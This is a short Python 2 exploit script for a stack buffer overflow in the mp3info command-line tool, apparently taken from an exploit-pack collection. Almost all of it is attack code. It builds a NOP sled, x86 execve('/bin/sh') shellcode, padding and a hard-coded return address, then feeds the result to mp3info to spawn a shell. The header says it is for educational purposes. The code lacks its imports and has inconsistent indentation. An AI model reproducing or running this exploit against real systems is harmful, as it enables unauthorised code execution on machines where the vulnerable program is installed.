# Waste of CPU clock N2
# Exploit for: mp3info! Latest version
# Author: jsacco - jsacco@exploitpack.com
# Vendor: http://ibiblio.org/mp3info/
# No-one-cares-about programs!

junk = "\x90\x90\x90\x90"*8 
shellcode = "\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
buffer = "\x90\x90\x90\x90"*89
eip = "\x10\xf0\xff\xbf"

print "# MP3info is prone to a Stack-BoF"
print "# Wasting CPU clocks on unusable exploits"
print "# This is exploit is for educational purposes"

try:
    subprocess.call(["mp3info", junk+shellcode+buffer+eip])
except OSError as e:
    if e.errno == os.errno.ENOENT:
    	print "MP3Info not found!"
    else:
   	print "Error executing exploit" 
    raise
